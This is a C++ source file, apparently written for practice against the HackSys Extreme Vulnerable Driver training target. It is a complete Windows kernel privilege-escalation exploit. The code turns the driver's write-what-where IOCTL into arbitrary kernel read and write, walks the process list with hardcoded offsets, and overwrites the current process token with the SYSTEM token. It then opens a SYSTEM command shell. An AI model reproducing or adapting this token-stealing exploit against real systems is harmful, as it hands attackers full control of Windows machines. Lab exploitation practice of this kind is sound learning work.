#include <Windows.h>
#include <stdio.h>
#include <Psapi.h> // for EnumDeviceDrivers()

static const DWORD HEVD_ARW_IOCTL = 0x22200b;

typedef unsigned long long u64;

// structure accepted by the HEVD ARW IOCTL
typedef struct WRITE_WHAT_WHERE {
	PVOID What;
	PVOID Where;
} WRITE_WHAT_WHERE;

void WriteQWORD(HANDLE hDriver, PVOID what, PVOID where) {
	WRITE_WHAT_WHERE writeRequest{};
	writeRequest.What = what;
	writeRequest.Where = where;

	DWORD dwBytesReturned = 0;
	DeviceIoControl(
		hDriver,
		HEVD_ARW_IOCTL,
		&writeRequest,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0x00,
		&dwBytesReturned,
		NULL);
}

u64 ReadQWORD(HANDLE hDriver, PVOID what) {
	u64 value = 0;
	WriteQWORD(hDriver, what, &value);
	return value;
}


u64 getKbAddr() {
	// technique from offensivepanda
	DWORD outputInfo = 0;
	DWORD callBuffer = 0;
	PVOID* bases = NULL;

	if (EnumDeviceDrivers(NULL, 0, &callBuffer)) {
		bases = (PVOID*)malloc(callBuffer); // set the size correctly
		if (EnumDeviceDrivers(bases, callBuffer, &outputInfo)) {
			return (u64)bases[0]; // returns ntoskrnl.exe base address, which is similar to first driver location
		}
	}
	return 0;
}

int main() {
	// offsets for later
	const u64 TokenOffset = 0x248;
	const u64 ActiveProcessLinksOffset = 0x1d8;
	const u64 UniqueProcessIdOffset = 0x1d0;
	const u64 PsInitialSystemProcessOffset = 0xfc5ab0;

	printf("[*] Running teseter usermode application\n");
	HANDLE hHevdDriver;
	// open handle
	hHevdDriver = CreateFileW(
		L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		nullptr,
		OPEN_EXISTING,
		0,
		nullptr
	);

	if (hHevdDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to open handle to the HEVD driver: %d \n", GetLastError());
		return 1;
	}
	else {
		printf("[*] Handle opened successfully\n\n");
	}

	u64 ntoskrnlAddress = getKbAddr();
	printf("[*] Ntoskrnl base address is: %p\n", ntoskrnlAddress);
	printf("[+] Attempting to read from IOCTL\n\n");

	//u64 testAddr = ReadQWORD(hHevdDriver, reinterpret_cast<PVOID>(ntoskrnlAddress));
	//printf("[*] Value read from memory: %p\n", testAddr);

	u64 PsInitialSystemProcessPtr = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(ntoskrnlAddress) + PsInitialSystemProcessOffset);
	printf("[*] PsInitialSystemProcessPtr: 0x%11x\n", PsInitialSystemProcessPtr);
	u64 SystemProcessTokenPtr = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(PsInitialSystemProcessPtr) + TokenOffset);
	printf("[*] SystemProcessTokenPtr: 0x%11x\n\n", SystemProcessTokenPtr);

	printf("[+] Checking current process\n");
	DWORD TargetPID = GetCurrentProcessId();
	u64 ProcessHead = PsInitialSystemProcessPtr;

start:
	ProcessHead = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(ProcessHead) + ActiveProcessLinksOffset) - ActiveProcessLinksOffset;
	if (ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(ProcessHead) + UniqueProcessIdOffset) != TargetPID) {
		goto start;
	}

	u64 TargetProcessTokenCount = ReadQWORD(hHevdDriver, reinterpret_cast<PBYTE>(ProcessHead) + TokenOffset) & 15;
	u64 FinalToken = TargetProcessTokenCount | SystemProcessTokenPtr;
	printf("[*] Token has been prepared\n");

	printf("[+] Stealing token\n\n");
	WriteQWORD(hHevdDriver, &FinalToken, reinterpret_cast<PBYTE>(ProcessHead) + TokenOffset);
	printf("[+] Closing HEVD handle\n");
	CloseHandle(hHevdDriver);

	// spawning new shell
	STARTUPINFOW StartupInfo{};
	StartupInfo.cb = sizeof(StartupInfo);
	PROCESS_INFORMATION ProcessInformation;
	if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, FALSE, 0, NULL, NULL,
		&StartupInfo, &ProcessInformation)) {
		WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
	}
}